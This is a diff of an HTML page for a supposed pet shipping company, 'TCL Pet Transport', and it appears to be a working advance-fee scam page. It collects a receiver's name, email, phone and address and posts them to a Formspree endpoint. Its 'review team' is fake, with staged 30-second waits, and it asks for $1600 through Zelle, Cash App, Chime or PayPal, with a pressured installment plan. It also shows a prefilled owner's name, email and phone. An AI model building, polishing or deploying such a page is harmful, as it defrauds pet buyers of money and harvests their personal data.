@@ -1,323 +1,413 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>TCL PET TRANSPORT</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body{
-  margin:0;
-  font-family:Arial, Helvetica, sans-serif;
-  background:url('https://images.unsplash.com/photo-1517849845537-4d257902454a') center/cover no-repeat;
-}
-.overlay{
-  min-height:100vh;
-  background:rgba(255,255,255,.93);
-  padding:20px;
-}
-.container{
-  max-width:560px;
-  margin:auto;
-  background:#fff;
-  border-radius:14px;
-  padding:20px;
-  box-shadow:0 6px 18px rgba(0,0,0,.18);
-}
-.logo{text-align:center;}
-.logo img{width:80px; border-radius:50%; border:2px solid #1a73e8; padding:4px;}
-h2,h3{text-align:center;}
-.section{
-  margin-top:15px;
-  border:1px solid #ddd;
-  border-radius:8px;
-  padding:12px;
-  background:#fafafa;
-}
-label{font-weight:bold;display:block;margin-top:10px;}
-input,textarea,select{
-  width:100%;
-  padding:10px;
-  margin-top:6px;
-  border-radius:6px;
-  border:1px solid #ccc;
-}
-input[readonly],textarea[readonly]{background:#eee;}
-.actions{
-  display:flex;
-  justify-content:space-between;
-  margin-top:25px;
-}
-.action{
-  color:#1a73e8;
-  cursor:pointer;
-  font-weight:bold;
-}
-.hidden{display:none;}
-.center{text-align:center;}
-.loader{
-  width:45px;height:45px;
-  border:4px solid #ddd;
-  border-top:4px solid #1a73e8;
-  border-radius:50%;
-  margin:20px auto;
-  animation:spin 1s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-.checkbox{
-  display:flex;
-  gap:10px;
-  margin-top:15px;
-  align-items:flex-start;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>TCL PET TRANSPORT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: url('https://images.unsplash.com/photo-1517849845537-4d257902454a') center/cover no-repeat;
+        }
+
+        .overlay {
+            min-height: 100vh;
+            background: rgba(255, 255, 255, 0.93);
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 560px;
+            margin: auto;
+            background: #fff;
+            border-radius: 14px;
+            padding: 20px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.18);
+        }
+
+        .logo {
+            text-align: center;
+        }
+
+        .logo img {
+            width: 80px;
+            border-radius: 50%;
+            border: 2px solid #1a73e8;
+            padding: 4px;
+        }
+
+        h2,
+        h3 {
+            text-align: center;
+        }
+
+        .section {
+            margin-top: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 12px;
+            background: #fafafa;
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
+        }
+
+        input,
+        textarea,
+        select {
+            width: 100%;
+            padding: 10px;
+            margin-top: 6px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+        }
+
+        input[readonly],
+        textarea[readonly] {
+            background: #eee;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+        }
+
+        .action {
+            color: #1a73e8;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .center {
+            text-align: center;
+        }
+
+        .loader {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #ddd;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .checkbox {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            align-items: flex-start;
+        }
+    </style>
 </head>
+
 <body>
-<div class="overlay">
+    <div class="overlay">
 
-<!-- HARD LOCK -->
-<div class="container hidden" id="locked"></div>
+        <!-- HARD LOCK -->
+        <div class="container hidden" id="locked"></div>
 
-<form id="mainForm" action="https://formspree.io/f/xeeeapoo" method="POST">
+        <form id="mainForm" action="https://formspree.io/f/xeeeapoo" method="POST">
 
-<!-- HIDDEN EMAIL DATA -->
-<input type="hidden" name="_subject" value="TCL Pet Transport – New Submission">
-<input type="hidden" name="_template" value="table">
-<input type="hidden" name="owner_phone_full" id="owner_phone_full">
-<input type="hidden" name="receiver_phone_full" id="receiver_phone_full">
-<input type="hidden" name="summary_data" id="summary_data">
+            <!-- HIDDEN EMAIL DATA -->
+            <input type="hidden" name="_subject" value="TCL Pet Transport – New Submission">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="owner_phone_full" id="owner_phone_full">
+            <input type="hidden" name="receiver_phone_full" id="receiver_phone_full">
+            <input type="hidden" name="summary_data" id="summary_data">
 
-<!-- FORM PAGE -->
-<div class="container" id="formPage">
-<div class="logo">
-<img src="https://images.unsplash.com/photo-1601758123927-ff52f9d22a9b?auto=format&fit=crop&w=100&q=80">
-</div>
-<h2>TCL PET TRANSPORT</h2>
+            <!-- FORM PAGE -->
+            <div class="container" id="formPage">
+                <div class="logo">
+                    <img src="https://images.unsplash.com/photo-1601758123927-ff52f9d22a9b?auto=format&fit=crop&w=100&q=80">
+                </div>
 
-<div class="section">
-<h3>Receiver and Owner Form</h3>
-<label>Name</label><input id="owner_name" value="Collins Dave" readonly>
-<label>Email</label><input id="owner_email" value="collinsdave167@gmail.com" readonly>
-<label>Country Code</label>
-<select id="owner_code">
-<option value="+1">🇺🇸 / 🇨🇦 +1</option>
-<option value="+44">🇬🇧 +44</option>
-<option value="+234">🇳🇬 +234</option>
-<option value="other">Other</option>
-</select>
-<label>Phone</label><input id="owner_phone" readonly value="+1 503-801-7342">
-<label>Address</label><textarea id="owner_address" readonly>742 Evergreen Street, Portland, OR</textarea>
-</div>
+                <h2>TCL PET TRANSPORT</h2>
 
-<div class="section">
-<h3>Receiver Information</h3>
-<label>Name</label><input id="receiver_name" required>
-<label>Email</label><input id="receiver_email" required>
-<label>Country Code</label>
-<select id="receiver_code">
-<option value="+1">🇺🇸 / 🇨🇦 +1</option>
-<option value="+44">🇬🇧 +44</option>
-<option value="+234">🇳🇬 +234</option>
-<option value="other">Other</option>
-</select>
-<label>Phone</label><input id="receiver_phone" required>
-<label>Delivery Address</label><textarea id="receiver_address" required></textarea>
-</div>
+                <div class="section">
+                    <h3>Receiver and Owner Form</h3>
 
-<div class="section">
-<h3>Tracking / Reference Number</h3>
-<input type="text" id="tracking_id" name="tracking_id" value="TCL-254756" readonly>
-<p class="center" style="font-size:12px;color:#555;">.</p>
-</div>
+                    <label>Name</label>
+                    <input id="owner_name" value="Collins Dave" readonly>
 
-<div class="actions">
-<span></span>
-<span class="action" onclick="validateAndStartReview()">Submit</span>
-</div>
-</div>
+                    <label>Email</label>
+                    <input id="owner_email" value="collinsdave167@gmail.com" readonly>
 
-<!-- REVIEW -->
-<div class="container hidden" id="review">
-<h3>Please wait</h3>
-<p class="center">TCL Pet Transport review team is reviewing your submission.</p>
-<div class="loader"></div>
-</div>
+                    <label>Country Code</label>
+                    <select id="owner_code">
+                        <option value="+1">🇺🇸 / 🇨🇦 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+234">🇳🇬 +234</option>
+                        <option value="other">Other</option>
+                    </select>
 
-<!-- SUMMARY -->
-<div class="container hidden" id="summary">
-<h3>Transport Details</h3>
-<div class="section">
-<label>Pickup</label><input readonly value="Miami, Florida">
-<label>Delivery</label><input readonly value="Los Angeles, California">
-<label>Pickup Date</label><input readonly value="March 2, 2026">
-<label>Delivery Date</label><input readonly value="March 6, 2026">
-</div>
+                    <label>Phone</label>
+                    <input id="owner_phone" readonly value="+1 503-801-7342">
 
-<div class="section">
-<h3>Payment Summary</h3>
-<p>Total: <b>$1600</b></p>
-<p>Deposit: <b>$100</b></p>
-<p>Balance: <b>$1500</b></p>
-</div>
+                    <label>Address</label>
+                    <textarea id="owner_address" readonly>5678 N Camino Seco, Tucson, AZ 85750,OR</textarea>
+                </div>
 
-<div class="actions">
-<span class="action" onclick="showInstallments()">Pay in installments</span>
-<span class="action" onclick="makePayment()">Make payment</span>
-</div>
-</div>
+                <div class="section">
+                    <h3>Receiver Information</h3>
 
-<!-- WAIT -->
-<div class="container hidden" id="wait">
-<h3>Please wait</h3>
-<div class="loader"></div>
-</div>
+                    <label>Name</label>
+                    <input id="receiver_name" required>
 
-<!-- PAYMENT METHODS -->
-<div class="container hidden" id="methods">
-<h3>Select Payment Method</h3>
-<p class="action center" onclick="finish()">Zelle</p>
-<p class="action center" onclick="finish()">PayPal</p>
-<p class="action center" onclick="finish()">Cash App</p>
-<p class="action center" onclick="finish()">Chime</p>
-<div class="actions">
-<span class="action" onclick="back()">Back</span>
-</div>
-</div>
+                    <label>Email</label>
+                    <input id="receiver_email" required>
 
-<!-- INSTALLMENTS -->
-<div class="container hidden" id="installments">
-<h3>Installment Plan</h3>
-<p>Down payment: <b>$200</b></p>
-<p>Weekly: <b>$500 (3 weeks)</b></p>
+                    <label>Country Code</label>
+                    <select id="receiver_code">
+                        <option value="+1">🇺🇸 / 🇨🇦 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+234">🇳🇬 +234</option>
+                        <option value="other">Other</option>
+                    </select>
 
-<label>Additional comments (optional)</label>
-<textarea id="installment_comment" placeholder="Write any note about your installment plan..."></textarea>
+                    <label>Phone</label>
+                    <input id="receiver_phone" required>
 
-<div class="checkbox">
-<input type="checkbox" required>
-<span>I agree payment will be made in 3 business weeks and delivery date will change.</span>
-</div>
+                    <label>Delivery Address</label>
+                    <textarea id="receiver_address" required></textarea>
+                </div>
 
-<div class="checkbox">
-<input type="checkbox" required>
-<span>I agree payment will be made by the owner.</span>
-</div>
+                <div class="section">
+                    <h3>Tracking / Reference Number</h3>
+                    <input type="text" id="tracking_id" name="tracking_id" value="TCL-254756" readonly>
+                    <p class="center" style="font-size:12px;color:#555;">.</p>
+                </div>
 
-<div class="actions">
-<span class="action" onclick="back()">Back</span>
-<span class="action" onclick="payInstallment()">Make payment $200</span>
-</div>
-</div>
+                <div class="actions">
+                    <span></span>
+                    <span class="action" onclick="validateAndStartReview()">Submit</span>
+                </div>
+            </div>
 
-<!-- FINAL -->
-<div class="container hidden" id="final">
-<h3>Submission Noted</h3>
-<p class="center">After review, payment details will be sent to you or the owner.</p>
-</div>
+            <!-- REVIEW -->
+            <div class="container hidden" id="review">
+                <h3>Please wait</h3>
+                <p class="center">TCL Pet Transport review team is reviewing your submission.</p>
+                <div class="loader"></div>
+            </div>
 
-</form>
-</div>
+            <!-- SUMMARY -->
+            <div class="container hidden" id="summary">
+                <h3>Transport Details</h3>
 
-<script>
-/* RESET DEVICE LOCK IF TRACKING ID CHANGES */
-let htmlTracking = document.getElementById('tracking_id').value;
-if(localStorage.getItem('TCL_TRACKING') && localStorage.getItem('TCL_TRACKING') !== htmlTracking){
-    localStorage.removeItem('TCL_DONE');
-    localStorage.removeItem('TCL_TRACKING');
-}
+                <div class="section">
+                    <label>Pickup</label>
+                    <input readonly value="5678 N Camino Seco, Tucson, AZ 85750">
 
-/* HARD LOCK */
-if(localStorage.getItem('TCL_DONE')){
-  document.getElementById('locked').innerHTML =
-  `<h3>Submission Completed</h3>
-   <p>This form has already been submitted on this device.</p>
-   <p><b>Tracking ID:</b> ${localStorage.getItem('TCL_TRACKING')}</p>`;
-  locked.classList.remove('hidden');
-  mainForm.classList.add('hidden');
-}
+                    <label>Delivery</label>
+                    <input readonly value="pending">
 
-/* PHONE FORMAT */
-function formatPhone(input, code){
-  let d = input.value.replace(/\D/g,'');
-  if(code.value === '+1'){
-    d=d.slice(0,10);
-    if(d.length>6) input.value=d.slice(0,3)+'-'+d.slice(3,6)+'-'+d.slice(6);
-    else if(d.length>3) input.value=d.slice(0,3)+'-'+d.slice(3);
-    else input.value=d;
-  } else input.value=d;
-}
-owner_phone.oninput=()=>formatPhone(owner_phone, owner_code);
-receiver_phone.oninput=()=>formatPhone(receiver_phone, receiver_code);
+                    <label>Pickup Date</label>
+                    <input readonly value="March 2, 2026">
 
-/* VALIDATION BEFORE REVIEW */
-function validateAndStartReview(){
-  if(!receiver_name.value || !receiver_email.value || !receiver_phone.value || !receiver_address.value){
-    alert("Please fill in all required receiver fields before continuing.");
-    return;
-  }
-  startReview();
-}
+                    <label>Delivery Date</label>
+                    <input readonly value="March 6, 2026">
+                </div>
 
-/* FLOW */
-function startReview(){
-  owner_phone_full.value = owner_code.value+' '+owner_phone.value;
-  receiver_phone_full.value = receiver_code.value+' '+receiver_phone.value;
+                <div class="section">
+                    <h3>Payment Summary</h3>
+                    <p>Total Payment : <b>$1600</b></p>
+                    <p>Payment Deposited: <b>$100</b></p>
+                    <p>Total Balance: <b>$1500</b></p>
+                </div>
 
-  summary_data.value =
-`Tracking ID: ${tracking_id.value}
+                <div class="actions">
+                    <span class="action" onclick="showInstallments()">Pay in installments</span>
+                    <span class="action" onclick="makePayment()">Make payment</span>
+                </div>
+            </div>
+
+            <!-- WAIT -->
+            <div class="container hidden" id="wait">
+                <h3>Please wait</h3>
+                <div class="loader"></div>
+            </div>
+
+            <!-- PAYMENT METHODS -->
+            <div class="container hidden" id="methods">
+                <h3>Select Payment Method</h3>
+                <p class="action center" onclick="finish()">Zelle</p>
+                <p class="action center" onclick="finish()">PayPal</p>
+                <p class="action center" onclick="finish()">Cash App</p>
+                <p class="action center" onclick="finish()">Chime</p>
+
+                <div class="actions">
+                    <span class="action" onclick="back()">Back</span>
+                </div>
+            </div>
+
+            <!-- INSTALLMENTS -->
+            <div class="container hidden" id="installments">
+                <h3>Installment Plan</h3>
+
+                <p>Down payment: <b>$200</b></p>
+                <p>Weekly: <b>$500 (3 weeks)</b></p>
+
+                <label>Additional comments (optional)</label>
+                <textarea id="installment_comment" placeholder="Write any note about your installment plan..."></textarea>
+
+                <div class="checkbox">
+                    <input type="checkbox" required>
+                    <span>I agree payment will be made in 3 business week.</span>
+                </div>
+
+                <div class="checkbox">
+                    <input type="checkbox" required>
+                    <span>I agree that there will be a change in delivering date.</span>
+                </div>
+
+                <div class="actions">
+                    <span class="action" onclick="back()">Back</span>
+                    <span class="action" onclick="payInstallment()">Make payment $200</span>
+                </div>
+            </div>
+
+            <!-- FINAL -->
+            <div class="container hidden" id="final">
+                <h3>Submission Noted</h3>
+                <p class="center">After review, payment details will be sent to you or the owner.</p>
+            </div>
+
+        </form>
+    </div>
+
+    <script>
+        /* RESET DEVICE LOCK IF TRACKING ID CHANGES */
+        let htmlTracking = document.getElementById('tracking_id').value;
+
+        if (localStorage.getItem('TCL_TRACKING') &&
+            localStorage.getItem('TCL_TRACKING') !== htmlTracking) {
+            localStorage.removeItem('TCL_DONE');
+            localStorage.removeItem('TCL_TRACKING');
+        }
+
+        /* HARD LOCK */
+        if (localStorage.getItem('TCL_DONE')) {
+            document.getElementById('locked').innerHTML =
+                `<h3>Submission Completed</h3>
+                 <p>This form has already been submitted on this device.</p>
+                 <p><b>Tracking ID:</b> ${localStorage.getItem('TCL_TRACKING')}</p>`;
+
+            locked.classList.remove('hidden');
+            mainForm.classList.add('hidden');
+        }
+
+        /* PHONE FORMAT */
+        function formatPhone(input, code) {
+            let d = input.value.replace(/\D/g, '');
+            if (code.value === '+1') {
+                d = d.slice(0, 10);
+                if (d.length > 6) input.value = d.slice(0, 3) + '-' + d.slice(3, 6) + '-' + d.slice(6);
+                else if (d.length > 3) input.value = d.slice(0, 3) + '-' + d.slice(3);
+                else input.value = d;
+            } else {
+                input.value = d;
+            }
+        }
+
+        owner_phone.oninput = () => formatPhone(owner_phone, owner_code);
+        receiver_phone.oninput = () => formatPhone(receiver_phone, receiver_code);
+
+        /* VALIDATION BEFORE REVIEW */
+        function validateAndStartReview() {
+            if (!receiver_name.value || !receiver_email.value ||
+                !receiver_phone.value || !receiver_address.value) {
+                alert("Please fill in all required receiver fields before continuing.");
+                return;
+            }
+            startReview();
+        }
+
+        /* FLOW */
+        function startReview() {
+            owner_phone_full.value = owner_code.value + ' ' + owner_phone.value;
+            receiver_phone_full.value = receiver_code.value + ' ' + receiver_phone.value;
+
+            summary_data.value =
+                `Tracking ID: ${tracking_id.value}
 Owner: ${owner_name.value}
 Receiver: ${receiver_name.value}
-Total: $1600
-Deposit: $100
-Balance: $1500
-Comment: ${document.getElementById('installment_comment') ? document.getElementById('installment_comment').value : ''}`;
+Total payment : $1600
+Payment Deposited: $100
+Total Balance: $1500
+Comment: ${document.getElementById('installment_comment')
+                    ? document.getElementById('installment_comment').value
+                    : ''}`;
 
-  localStorage.setItem('TCL_TRACKING', tracking_id.value);
+            localStorage.setItem('TCL_TRACKING', tracking_id.value);
 
-  formPage.classList.add('hidden');
-  review.classList.remove('hidden');
-  setTimeout(()=>{
-    review.classList.add('hidden');
-    summary.classList.remove('hidden');
-  },30000);
-}
+            formPage.classList.add('hidden');
+            review.classList.remove('hidden');
 
-/* PAYMENT & INSTALLMENTS FLOW */
-function makePayment(){
-  summary.classList.add('hidden');
-  wait.classList.remove('hidden');
-  setTimeout(()=>{
-    wait.classList.add('hidden');
-    methods.classList.remove('hidden');
-  },30000);
-}
+            setTimeout(() => {
+                review.classList.add('hidden');
+                summary.classList.remove('hidden');
+            }, 30000);
+        }
 
-// FIXED INSTALLMENTS FUNCTION
-function showInstallments(){
-  summary.classList.add('hidden');
-  wait.classList.remove('hidden');
-  setTimeout(()=>{
-    wait.classList.add('hidden');
-    document.getElementById('installments').classList.remove('hidden');
-  },30000);
-}
+        /* PAYMENT & INSTALLMENTS FLOW */
+        function makePayment() {
+            summary.classList.add('hidden');
+            wait.classList.remove('hidden');
 
-function payInstallment(){
-  document.getElementById('installments').classList.add('hidden');
-  methods.classList.remove('hidden');
-}
+            setTimeout(() => {
+                wait.classList.add('hidden');
+                methods.classList.remove('hidden');
+            }, 30000);
+        }
 
-function back(){
-  methods.classList.add('hidden');
-  document.getElementById('installments').classList.add('hidden');
-  summary.classList.remove('hidden');
-}
+        function showInstallments() {
+            summary.classList.add('hidden');
+            wait.classList.remove('hidden');
 
-function finish(){
-  fetch(mainForm.action,{method:'POST',body:new FormData(mainForm)});
-  localStorage.setItem('TCL_DONE','yes');
-  methods.classList.add('hidden');
-  final.classList.remove('hidden');
-}
-</script>
+            setTimeout(() => {
+                wait.classList.add('hidden');
+                installments.classList.remove('hidden');
+            }, 30000);
+        }
+
+        function payInstallment() {
+            installments.classList.add('hidden');
+            methods.classList.remove('hidden');
+        }
+
+        function back() {
+            methods.classList.add('hidden');
+            installments.classList.add('hidden');
+            summary.classList.remove('hidden');
+        }
+
+        function finish() {
+            fetch(mainForm.action, {
+                method: 'POST',
+                body: new FormData(mainForm)
+            });
+
+            localStorage.setItem('TCL_DONE', 'yes');
+            methods.classList.add('hidden');
+            final.classList.remove('hidden');
+        }
+    </script>
 </body>
-</html>
+              </html>
